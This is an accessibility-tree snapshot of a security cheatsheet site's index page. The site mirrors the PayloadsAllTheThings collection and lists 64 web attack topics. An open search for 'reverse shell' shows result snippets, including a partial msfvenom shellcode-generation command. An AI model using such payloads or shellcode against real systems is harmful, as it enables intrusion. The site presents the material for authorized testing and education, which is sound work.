@@ -1,0 +1,662 @@
+- generic [ref=f11e549]:
+  - banner [ref=f11e550]:
+    - generic [ref=f11e551]:
+      - link "DÆMON//SEC home" [ref=f11e552] [cursor=pointer]:
+        - /url: /daemon-sec-cheatsheet/
+        - text: DÆMON
+        - generic [ref=f11e553]: //
+        - text: SEC
+        - generic [ref=f11e554]: _
+      - navigation "Primary" [ref=f11e555]:
+        - link "01 Vault" [ref=f11e556] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/
+          - generic [ref=f11e557]: "01"
+          - generic [ref=f11e558]: Vault
+        - link "02 Payloads" [ref=f11e559] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads
+          - generic [ref=f11e560]: "02"
+          - generic [ref=f11e561]: Payloads
+        - link "03 Tags" [ref=f11e562] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/tags
+          - generic [ref=f11e563]: "03"
+          - generic [ref=f11e564]: Tags
+        - link "04 Credits" [ref=f11e565] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/credits
+          - generic [ref=f11e566]: "04"
+          - generic [ref=f11e567]: Credits
+      - generic [ref=f11e568]:
+        - button "Search cheatsheets" [ref=f11e569] [cursor=pointer]:
+          - generic [ref=f11e572]: Search
+          - generic [ref=f11e573]: /
+        - button "Toggle theme" [ref=f11e574] [cursor=pointer]
+        - link "DÆMON main site" [ref=f11e579] [cursor=pointer]:
+          - /url: https://daemon-404.github.io
+        - link "GitHub repository" [ref=f11e582] [cursor=pointer]:
+          - /url: https://github.com/DAEMON-404/daemon-sec-cheatsheet
+  - main [ref=f11e585]:
+    - generic [ref=f11e588]:
+      - generic [ref=f11e589]:
+        - paragraph [ref=f11e590]:
+          - generic [ref=f11e591]: "02"
+          - generic [ref=f11e592]: "^:"
+          - generic [ref=f11e593]: Full mirror · MIT
+        - heading "PayloadsAllTheThings" [level=1] [ref=f11e595]
+        - paragraph [ref=f11e596]: A complete on-site mirror of swisskyrepo's payload and bypass reference — searchable offline, every page linked back to source.
+      - generic [ref=f11e597]:
+        - generic [ref=f11e598]:
+          - term [ref=f11e599]: Topics
+          - definition [ref=f11e600]: "64"
+        - generic [ref=f11e601]:
+          - term [ref=f11e602]: Pages
+          - definition [ref=f11e603]: "135"
+        - generic [ref=f11e604]:
+          - term [ref=f11e605]: License
+          - definition [ref=f11e606]: MIT
+    - generic [ref=f11e607]:
+      - navigation [ref=f11e608]:
+        - link "~" [ref=f11e609] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/
+        - generic [ref=f11e610]: /
+        - generic [ref=f11e611]: payloads
+      - complementary [ref=f11e612]:
+        - generic [ref=f11e613]: mirror
+        - generic [ref=f11e614]:
+          - text: Mirrored verbatim from the upstream repo. Images and raw payload files load from GitHub; see each page's
+          - emphasis [ref=f11e615]: source
+          - text: link.
+          - generic [ref=f11e616]:
+            - text: MIT ·
+            - link "full credits & license" [ref=f11e617] [cursor=pointer]:
+              - /url: /daemon-sec-cheatsheet/credits
+            - text: ·
+            - code [ref=f11e618]: 3bff425
+        - link "upstream" [ref=f11e619] [cursor=pointer]:
+          - /url: https://github.com/swisskyrepo/PayloadsAllTheThings
+      - generic [ref=f11e621]:
+        - link "01 payload Account Takeover 2 pages" [ref=f11e622] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/account-takeover
+          - generic [ref=f11e623]:
+            - generic [ref=f11e624]: "01"
+            - generic [ref=f11e625]: payload
+            - generic [ref=f11e629]: Account Takeover
+            - generic [ref=f11e630]: 2 pages
+        - link "02 payload API Key Leaks 2 pages" [ref=f11e634] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/api-key-leaks
+          - generic [ref=f11e635]:
+            - generic [ref=f11e636]: "02"
+            - generic [ref=f11e637]: payload
+            - generic [ref=f11e641]: API Key Leaks
+            - generic [ref=f11e642]: 2 pages
+        - link "03 payload Brute Force Rate Limit 1 page" [ref=f11e646] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/brute-force-rate-limit
+          - generic [ref=f11e647]:
+            - generic [ref=f11e648]: "03"
+            - generic [ref=f11e649]: payload
+            - generic [ref=f11e653]: Brute Force Rate Limit
+            - generic [ref=f11e654]: 1 page
+        - link "04 payload Business Logic Errors 1 page" [ref=f11e658] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/business-logic-errors
+          - generic [ref=f11e659]:
+            - generic [ref=f11e660]: "04"
+            - generic [ref=f11e661]: payload
+            - generic [ref=f11e665]: Business Logic Errors
+            - generic [ref=f11e666]: 1 page
+        - link "05 payload Clickjacking 1 page" [ref=f11e670] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/clickjacking
+          - generic [ref=f11e671]:
+            - generic [ref=f11e672]: "05"
+            - generic [ref=f11e673]: payload
+            - generic [ref=f11e677]: Clickjacking
+            - generic [ref=f11e678]: 1 page
+        - link "06 payload Client Side Path Traversal 1 page" [ref=f11e682] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/client-side-path-traversal
+          - generic [ref=f11e683]:
+            - generic [ref=f11e684]: "06"
+            - generic [ref=f11e685]: payload
+            - generic [ref=f11e689]: Client Side Path Traversal
+            - generic [ref=f11e690]: 1 page
+        - link "07 payload Command Injection 1 page" [ref=f11e694] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/command-injection
+          - generic [ref=f11e695]:
+            - generic [ref=f11e696]: "07"
+            - generic [ref=f11e697]: payload
+            - generic [ref=f11e701]: Command Injection
+            - generic [ref=f11e702]: 1 page
+        - link "08 payload CORS Misconfiguration 1 page" [ref=f11e706] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/cors-misconfiguration
+          - generic [ref=f11e707]:
+            - generic [ref=f11e708]: "08"
+            - generic [ref=f11e709]: payload
+            - generic [ref=f11e713]: CORS Misconfiguration
+            - generic [ref=f11e714]: 1 page
+        - link "09 payload CRLF Injection 1 page" [ref=f11e718] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/crlf-injection
+          - generic [ref=f11e719]:
+            - generic [ref=f11e720]: "09"
+            - generic [ref=f11e721]: payload
+            - generic [ref=f11e725]: CRLF Injection
+            - generic [ref=f11e726]: 1 page
+        - link "10 payload Cross-Site Request Forgery 1 page" [ref=f11e730] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/cross-site-request-forgery
+          - generic [ref=f11e731]:
+            - generic [ref=f11e732]: "10"
+            - generic [ref=f11e733]: payload
+            - generic [ref=f11e737]: Cross-Site Request Forgery
+            - generic [ref=f11e738]: 1 page
+        - link "11 payload CSS Injection 1 page" [ref=f11e742] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/css-injection
+          - generic [ref=f11e743]:
+            - generic [ref=f11e744]: "11"
+            - generic [ref=f11e745]: payload
+            - generic [ref=f11e749]: CSS Injection
+            - generic [ref=f11e750]: 1 page
+        - link "12 payload CSV Injection 1 page" [ref=f11e754] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/csv-injection
+          - generic [ref=f11e755]:
+            - generic [ref=f11e756]: "12"
+            - generic [ref=f11e757]: payload
+            - generic [ref=f11e761]: CSV Injection
+            - generic [ref=f11e762]: 1 page
+        - link "13 payload CVE Exploits 2 pages" [ref=f11e766] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/cve-exploits
+          - generic [ref=f11e767]:
+            - generic [ref=f11e768]: "13"
+            - generic [ref=f11e769]: payload
+            - generic [ref=f11e773]: CVE Exploits
+            - generic [ref=f11e774]: 2 pages
+        - link "14 payload Denial of Service 1 page" [ref=f11e778] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/denial-of-service
+          - generic [ref=f11e779]:
+            - generic [ref=f11e780]: "14"
+            - generic [ref=f11e781]: payload
+            - generic [ref=f11e785]: Denial of Service
+            - generic [ref=f11e786]: 1 page
+        - link "15 payload Dependency Confusion 1 page" [ref=f11e790] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/dependency-confusion
+          - generic [ref=f11e791]:
+            - generic [ref=f11e792]: "15"
+            - generic [ref=f11e793]: payload
+            - generic [ref=f11e797]: Dependency Confusion
+            - generic [ref=f11e798]: 1 page
+        - link "16 payload Directory Traversal 1 page" [ref=f11e802] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/directory-traversal
+          - generic [ref=f11e803]:
+            - generic [ref=f11e804]: "16"
+            - generic [ref=f11e805]: payload
+            - generic [ref=f11e809]: Directory Traversal
+            - generic [ref=f11e810]: 1 page
+        - link "17 payload DNS Rebinding 1 page" [ref=f11e814] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/dns-rebinding
+          - generic [ref=f11e815]:
+            - generic [ref=f11e816]: "17"
+            - generic [ref=f11e817]: payload
+            - generic [ref=f11e821]: DNS Rebinding
+            - generic [ref=f11e822]: 1 page
+        - link "18 payload DOM Clobbering 1 page" [ref=f11e826] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/dom-clobbering
+          - generic [ref=f11e827]:
+            - generic [ref=f11e828]: "18"
+            - generic [ref=f11e829]: payload
+            - generic [ref=f11e833]: DOM Clobbering
+            - generic [ref=f11e834]: 1 page
+        - link "19 payload Encoding Transformations 1 page" [ref=f11e838] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/encoding-transformations
+          - generic [ref=f11e839]:
+            - generic [ref=f11e840]: "19"
+            - generic [ref=f11e841]: payload
+            - generic [ref=f11e845]: Encoding Transformations
+            - generic [ref=f11e846]: 1 page
+        - link "20 payload External Variable Modification 1 page" [ref=f11e850] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/external-variable-modification
+          - generic [ref=f11e851]:
+            - generic [ref=f11e852]: "20"
+            - generic [ref=f11e853]: payload
+            - generic [ref=f11e857]: External Variable Modification
+            - generic [ref=f11e858]: 1 page
+        - link "21 payload File Inclusion 3 pages" [ref=f11e862] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/file-inclusion
+          - generic [ref=f11e863]:
+            - generic [ref=f11e864]: "21"
+            - generic [ref=f11e865]: payload
+            - generic [ref=f11e869]: File Inclusion
+            - generic [ref=f11e870]: 3 pages
+        - link "22 payload Google Web Toolkit 1 page" [ref=f11e874] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/google-web-toolkit
+          - generic [ref=f11e875]:
+            - generic [ref=f11e876]: "22"
+            - generic [ref=f11e877]: payload
+            - generic [ref=f11e881]: Google Web Toolkit
+            - generic [ref=f11e882]: 1 page
+        - link "23 payload GraphQL Injection 1 page" [ref=f11e886] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/graphql-injection
+          - generic [ref=f11e887]:
+            - generic [ref=f11e888]: "23"
+            - generic [ref=f11e889]: payload
+            - generic [ref=f11e893]: GraphQL Injection
+            - generic [ref=f11e894]: 1 page
+        - link "24 payload Headless Browser 1 page" [ref=f11e898] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/headless-browser
+          - generic [ref=f11e899]:
+            - generic [ref=f11e900]: "24"
+            - generic [ref=f11e901]: payload
+            - generic [ref=f11e905]: Headless Browser
+            - generic [ref=f11e906]: 1 page
+        - link "25 payload Hidden Parameters 1 page" [ref=f11e910] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/hidden-parameters
+          - generic [ref=f11e911]:
+            - generic [ref=f11e912]: "25"
+            - generic [ref=f11e913]: payload
+            - generic [ref=f11e917]: Hidden Parameters
+            - generic [ref=f11e918]: 1 page
+        - link "26 payload HTTP Parameter Pollution 1 page" [ref=f11e922] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/http-parameter-pollution
+          - generic [ref=f11e923]:
+            - generic [ref=f11e924]: "26"
+            - generic [ref=f11e925]: payload
+            - generic [ref=f11e929]: HTTP Parameter Pollution
+            - generic [ref=f11e930]: 1 page
+        - link "27 payload Insecure Deserialization 7 pages" [ref=f11e934] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/insecure-deserialization
+          - generic [ref=f11e935]:
+            - generic [ref=f11e936]: "27"
+            - generic [ref=f11e937]: payload
+            - generic [ref=f11e941]: Insecure Deserialization
+            - generic [ref=f11e942]: 7 pages
+        - link "28 payload Insecure Direct Object References 1 page" [ref=f11e946] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/insecure-direct-object-references
+          - generic [ref=f11e947]:
+            - generic [ref=f11e948]: "28"
+            - generic [ref=f11e949]: payload
+            - generic [ref=f11e953]: Insecure Direct Object References
+            - generic [ref=f11e954]: 1 page
+        - link "29 payload Insecure Management Interface 1 page" [ref=f11e958] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/insecure-management-interface
+          - generic [ref=f11e959]:
+            - generic [ref=f11e960]: "29"
+            - generic [ref=f11e961]: payload
+            - generic [ref=f11e965]: Insecure Management Interface
+            - generic [ref=f11e966]: 1 page
+        - link "30 payload Insecure Randomness 1 page" [ref=f11e970] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/insecure-randomness
+          - generic [ref=f11e971]:
+            - generic [ref=f11e972]: "30"
+            - generic [ref=f11e973]: payload
+            - generic [ref=f11e977]: Insecure Randomness
+            - generic [ref=f11e978]: 1 page
+        - link "31 payload Insecure Source Code Management 5 pages" [ref=f11e982] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/insecure-source-code-management
+          - generic [ref=f11e983]:
+            - generic [ref=f11e984]: "31"
+            - generic [ref=f11e985]: payload
+            - generic [ref=f11e989]: Insecure Source Code Management
+            - generic [ref=f11e990]: 5 pages
+        - link "32 payload Java RMI 1 page" [ref=f11e994] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/java-rmi
+          - generic [ref=f11e995]:
+            - generic [ref=f11e996]: "32"
+            - generic [ref=f11e997]: payload
+            - generic [ref=f11e1001]: Java RMI
+            - generic [ref=f11e1002]: 1 page
+        - link "33 payload JSON Web Token 1 page" [ref=f11e1006] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/json-web-token
+          - generic [ref=f11e1007]:
+            - generic [ref=f11e1008]: "33"
+            - generic [ref=f11e1009]: payload
+            - generic [ref=f11e1013]: JSON Web Token
+            - generic [ref=f11e1014]: 1 page
+        - link "34 payload LaTeX Injection 1 page" [ref=f11e1018] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/latex-injection
+          - generic [ref=f11e1019]:
+            - generic [ref=f11e1020]: "34"
+            - generic [ref=f11e1021]: payload
+            - generic [ref=f11e1025]: LaTeX Injection
+            - generic [ref=f11e1026]: 1 page
+        - link "35 payload LDAP Injection 1 page" [ref=f11e1030] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/ldap-injection
+          - generic [ref=f11e1031]:
+            - generic [ref=f11e1032]: "35"
+            - generic [ref=f11e1033]: payload
+            - generic [ref=f11e1037]: LDAP Injection
+            - generic [ref=f11e1038]: 1 page
+        - link "36 payload Mass Assignment 1 page" [ref=f11e1042] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/mass-assignment
+          - generic [ref=f11e1043]:
+            - generic [ref=f11e1044]: "36"
+            - generic [ref=f11e1045]: payload
+            - generic [ref=f11e1049]: Mass Assignment
+            - generic [ref=f11e1050]: 1 page
+        - link "37 payload Methodology and Resources 33 pages" [ref=f11e1054] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/methodology-and-resources
+          - generic [ref=f11e1055]:
+            - generic [ref=f11e1056]: "37"
+            - generic [ref=f11e1057]: payload
+            - generic [ref=f11e1061]: Methodology and Resources
+            - generic [ref=f11e1062]: 33 pages
+        - link "38 payload NoSQL Injection 1 page" [ref=f11e1066] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/nosql-injection
+          - generic [ref=f11e1067]:
+            - generic [ref=f11e1068]: "38"
+            - generic [ref=f11e1069]: payload
+            - generic [ref=f11e1073]: NoSQL Injection
+            - generic [ref=f11e1074]: 1 page
+        - link "39 payload OAuth Misconfiguration 1 page" [ref=f11e1078] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/oauth-misconfiguration
+          - generic [ref=f11e1079]:
+            - generic [ref=f11e1080]: "39"
+            - generic [ref=f11e1081]: payload
+            - generic [ref=f11e1085]: OAuth Misconfiguration
+            - generic [ref=f11e1086]: 1 page
+        - link "40 payload Open Redirect 1 page" [ref=f11e1090] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/open-redirect
+          - generic [ref=f11e1091]:
+            - generic [ref=f11e1092]: "40"
+            - generic [ref=f11e1093]: payload
+            - generic [ref=f11e1097]: Open Redirect
+            - generic [ref=f11e1098]: 1 page
+        - link "41 payload ORM Leak 1 page" [ref=f11e1102] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/orm-leak
+          - generic [ref=f11e1103]:
+            - generic [ref=f11e1104]: "41"
+            - generic [ref=f11e1105]: payload
+            - generic [ref=f11e1109]: ORM Leak
+            - generic [ref=f11e1110]: 1 page
+        - link "42 payload Prompt Injection 1 page" [ref=f11e1114] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/prompt-injection
+          - generic [ref=f11e1115]:
+            - generic [ref=f11e1116]: "42"
+            - generic [ref=f11e1117]: payload
+            - generic [ref=f11e1121]: Prompt Injection
+            - generic [ref=f11e1122]: 1 page
+        - link "43 payload Prototype Pollution 1 page" [ref=f11e1126] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/prototype-pollution
+          - generic [ref=f11e1127]:
+            - generic [ref=f11e1128]: "43"
+            - generic [ref=f11e1129]: payload
+            - generic [ref=f11e1133]: Prototype Pollution
+            - generic [ref=f11e1134]: 1 page
+        - link "44 payload Race Condition 1 page" [ref=f11e1138] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/race-condition
+          - generic [ref=f11e1139]:
+            - generic [ref=f11e1140]: "44"
+            - generic [ref=f11e1141]: payload
+            - generic [ref=f11e1145]: Race Condition
+            - generic [ref=f11e1146]: 1 page
+        - link "45 payload Regular Expression 1 page" [ref=f11e1150] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/regular-expression
+          - generic [ref=f11e1151]:
+            - generic [ref=f11e1152]: "45"
+            - generic [ref=f11e1153]: payload
+            - generic [ref=f11e1157]: Regular Expression
+            - generic [ref=f11e1158]: 1 page
+        - link "46 payload Request Smuggling 1 page" [ref=f11e1162] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/request-smuggling
+          - generic [ref=f11e1163]:
+            - generic [ref=f11e1164]: "46"
+            - generic [ref=f11e1165]: payload
+            - generic [ref=f11e1169]: Request Smuggling
+            - generic [ref=f11e1170]: 1 page
+        - link "47 payload Reverse Proxy Misconfigurations 1 page" [ref=f11e1174] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/reverse-proxy-misconfigurations
+          - generic [ref=f11e1175]:
+            - generic [ref=f11e1176]: "47"
+            - generic [ref=f11e1177]: payload
+            - generic [ref=f11e1181]: Reverse Proxy Misconfigurations
+            - generic [ref=f11e1182]: 1 page
+        - link "48 payload SAML Injection 1 page" [ref=f11e1186] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/saml-injection
+          - generic [ref=f11e1187]:
+            - generic [ref=f11e1188]: "48"
+            - generic [ref=f11e1189]: payload
+            - generic [ref=f11e1193]: SAML Injection
+            - generic [ref=f11e1194]: 1 page
+        - link "49 payload Server Side Include Injection 1 page" [ref=f11e1198] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/server-side-include-injection
+          - generic [ref=f11e1199]:
+            - generic [ref=f11e1200]: "49"
+            - generic [ref=f11e1201]: payload
+            - generic [ref=f11e1205]: Server Side Include Injection
+            - generic [ref=f11e1206]: 1 page
+        - link "50 payload Server Side Request Forgery 3 pages" [ref=f11e1210] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/server-side-request-forgery
+          - generic [ref=f11e1211]:
+            - generic [ref=f11e1212]: "50"
+            - generic [ref=f11e1213]: payload
+            - generic [ref=f11e1217]: Server Side Request Forgery
+            - generic [ref=f11e1218]: 3 pages
+        - link "51 payload Server Side Template Injection 8 pages" [ref=f11e1222] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/server-side-template-injection
+          - generic [ref=f11e1223]:
+            - generic [ref=f11e1224]: "51"
+            - generic [ref=f11e1225]: payload
+            - generic [ref=f11e1229]: Server Side Template Injection
+            - generic [ref=f11e1230]: 8 pages
+        - link "52 payload SQL Injection 10 pages" [ref=f11e1234] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/sql-injection
+          - generic [ref=f11e1235]:
+            - generic [ref=f11e1236]: "52"
+            - generic [ref=f11e1237]: payload
+            - generic [ref=f11e1241]: SQL Injection
+            - generic [ref=f11e1242]: 10 pages
+        - link "53 payload Tabnabbing 1 page" [ref=f11e1246] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/tabnabbing
+          - generic [ref=f11e1247]:
+            - generic [ref=f11e1248]: "53"
+            - generic [ref=f11e1249]: payload
+            - generic [ref=f11e1253]: Tabnabbing
+            - generic [ref=f11e1254]: 1 page
+        - link "54 payload Type Juggling 1 page" [ref=f11e1258] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/type-juggling
+          - generic [ref=f11e1259]:
+            - generic [ref=f11e1260]: "54"
+            - generic [ref=f11e1261]: payload
+            - generic [ref=f11e1265]: Type Juggling
+            - generic [ref=f11e1266]: 1 page
+        - link "55 payload Upload Insecure Files 2 pages" [ref=f11e1270] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/upload-insecure-files
+          - generic [ref=f11e1271]:
+            - generic [ref=f11e1272]: "55"
+            - generic [ref=f11e1273]: payload
+            - generic [ref=f11e1277]: Upload Insecure Files
+            - generic [ref=f11e1278]: 2 pages
+        - link "56 payload Virtual Hosts 1 page" [ref=f11e1282] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/virtual-hosts
+          - generic [ref=f11e1283]:
+            - generic [ref=f11e1284]: "56"
+            - generic [ref=f11e1285]: payload
+            - generic [ref=f11e1289]: Virtual Hosts
+            - generic [ref=f11e1290]: 1 page
+        - link "57 payload Web Cache Deception 1 page" [ref=f11e1294] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/web-cache-deception
+          - generic [ref=f11e1295]:
+            - generic [ref=f11e1296]: "57"
+            - generic [ref=f11e1297]: payload
+            - generic [ref=f11e1301]: Web Cache Deception
+            - generic [ref=f11e1302]: 1 page
+        - link "58 payload Web Sockets 1 page" [ref=f11e1306] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/web-sockets
+          - generic [ref=f11e1307]:
+            - generic [ref=f11e1308]: "58"
+            - generic [ref=f11e1309]: payload
+            - generic [ref=f11e1313]: Web Sockets
+            - generic [ref=f11e1314]: 1 page
+        - link "59 payload XPATH Injection 1 page" [ref=f11e1318] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/xpath-injection
+          - generic [ref=f11e1319]:
+            - generic [ref=f11e1320]: "59"
+            - generic [ref=f11e1321]: payload
+            - generic [ref=f11e1325]: XPATH Injection
+            - generic [ref=f11e1326]: 1 page
+        - link "60 payload XS-Leak 1 page" [ref=f11e1330] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/xs-leak
+          - generic [ref=f11e1331]:
+            - generic [ref=f11e1332]: "60"
+            - generic [ref=f11e1333]: payload
+            - generic [ref=f11e1337]: XS-Leak
+            - generic [ref=f11e1338]: 1 page
+        - link "61 payload XSLT Injection 1 page" [ref=f11e1342] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/xslt-injection
+          - generic [ref=f11e1343]:
+            - generic [ref=f11e1344]: "61"
+            - generic [ref=f11e1345]: payload
+            - generic [ref=f11e1349]: XSLT Injection
+            - generic [ref=f11e1350]: 1 page
+        - link "62 payload XSS Injection 6 pages" [ref=f11e1354] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/xss-injection
+          - generic [ref=f11e1355]:
+            - generic [ref=f11e1356]: "62"
+            - generic [ref=f11e1357]: payload
+            - generic [ref=f11e1361]: XSS Injection
+            - generic [ref=f11e1362]: 6 pages
+        - link "63 payload XXE Injection 1 page" [ref=f11e1366] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/xxe-injection
+          - generic [ref=f11e1367]:
+            - generic [ref=f11e1368]: "63"
+            - generic [ref=f11e1369]: payload
+            - generic [ref=f11e1373]: XXE Injection
+            - generic [ref=f11e1374]: 1 page
+        - link "64 payload Zip Slip 1 page" [ref=f11e1378] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/zip-slip
+          - generic [ref=f11e1379]:
+            - generic [ref=f11e1380]: "64"
+            - generic [ref=f11e1381]: payload
+            - generic [ref=f11e1385]: Zip Slip
+            - generic [ref=f11e1386]: 1 page
+  - contentinfo [ref=f11e1390]:
+    - generic [ref=f11e1391]:
+      - generic [ref=f11e1392]:
+        - link "DÆMON // SEC" [ref=f11e1393] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/
+          - text: DÆMON
+          - generic [ref=f11e1394]: //
+          - text: SEC
+        - paragraph [ref=f11e1395]: A curated vault of IT & security cheatsheets. For authorized testing, CTFs, and education only. Know your scope; get permission first.
+      - generic [ref=f11e1396]:
+        - link "daemon-404.github.io ↗" [ref=f11e1397] [cursor=pointer]:
+          - /url: https://daemon-404.github.io
+        - link "github / daemon-sec-cheatsheet ↗" [ref=f11e1398] [cursor=pointer]:
+          - /url: https://github.com/DAEMON-404/daemon-sec-cheatsheet
+        - generic [ref=f11e1399]:
+          - text: Payloads mirrored from
+          - link "PayloadsAllTheThings" [ref=f11e1400] [cursor=pointer]:
+            - /url: https://github.com/swisskyrepo/PayloadsAllTheThings
+          - text: (MIT) ·
+          - link "credits" [ref=f11e1401] [cursor=pointer]:
+            - /url: /daemon-sec-cheatsheet/credits
+        - generic [ref=f11e1402]: © 2026 DÆMON//SEC · MIT
+        - generic [ref=f11e1403]: Rosé Pine · Astro · Pagefind
+  - dialog "Search cheatsheets" [ref=f11e1406]:
+    - generic [ref=f11e1407]:
+      - combobox "Search query" [expanded] [active] [ref=f11e1411]: reverse shell
+      - button "Close search" [ref=f11e1412] [cursor=pointer]
+    - paragraph [ref=f11e1415]:
+      - generic [ref=f11e1416]: 8 of 42 matches
+      - generic [ref=f11e1417]: ↑↓ ↵
+    - listbox "Search results" [ref=f11e1418]:
+      - option "01 PAY Reverse Shell Cheat Sheet Content of this page has been moved to InternalAllTheThings/cheatsheet/shell-reverse. Tools. Reverse Shell Awk. Automatic Reverse Shell Generator. Bash TCP. Bash UDP. C. Dart. Golang. Groovy" [selected] [ref=f11e1419] [cursor=pointer]:
+        - generic [ref=f11e1420]: "01"
+        - generic [ref=f11e1421]: PAY
+        - generic [ref=f11e1422]: Reverse Shell Cheat Sheet
+        - generic [ref=f11e1423]:
+          - text: Content of this page has been moved to
+          - mark [ref=f11e1424]: InternalAllTheThings/cheatsheet/shell-reverse.
+          - text: Tools.
+          - mark [ref=f11e1425]: Reverse
+          - mark [ref=f11e1426]: Shell
+          - text: Awk. Automatic
+          - mark [ref=f11e1427]: Reverse
+          - mark [ref=f11e1428]: Shell
+          - text: Generator. Bash TCP. Bash UDP. C. Dart. Golang. Groovy
+      - 'option "02 PWN Stack-Based Buffer Overflow (Win x86) Generating Shellcode (msfvenom). # Local privesc / command execution payload msfvenom -p ''windows/exec'' CMD=''cmd.exe'' -f ''python'' -b ''\\x00'' # Reverse shell payload (exclude null + newline bad chars) msfvenom -p" [ref=f11e1432] [cursor=pointer]':
+        - generic [ref=f11e1433]: "02"
+        - generic [ref=f11e1434]: PWN
+        - generic [ref=f11e1435]: Stack-Based Buffer Overflow (Win x86)
+        - generic [ref=f11e1436]:
+          - text: Generating
+          - mark [ref=f11e1437]: Shellcode
+          - text: "(msfvenom). # Local privesc / command execution payload msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\\x00' #"
+          - mark [ref=f11e1438]: Reverse
+          - mark [ref=f11e1439]: shell
+          - text: payload (exclude null + newline bad chars) msfvenom -p
+      - option "03 PWN TTY and Escaping Restricted Env Interactive Shells & Restricted Shell Escapes — Cheat Sheet. A comprehensive reference for spawning interactive TTY shells from dumb/reverse shells, upgrading them to fully interactive terminals, and escaping restricted shell" [ref=f11e1443] [cursor=pointer]:
+        - generic [ref=f11e1444]: "03"
+        - generic [ref=f11e1445]: PWN
+        - generic [ref=f11e1446]: TTY and Escaping Restricted Env
+        - generic [ref=f11e1447]:
+          - text: Interactive
+          - mark [ref=f11e1448]: Shells
+          - text: "& Restricted"
+          - mark [ref=f11e1449]: Shell
+          - text: Escapes — Cheat Sheet. A comprehensive reference for spawning interactive TTY
+          - mark [ref=f11e1450]: shells
+          - text: from
+          - mark [ref=f11e1451]: dumb/reverse
+          - mark [ref=f11e1452]: shells,
+          - text: upgrading them to fully interactive terminals, and escaping restricted
+          - mark [ref=f11e1453]: shell
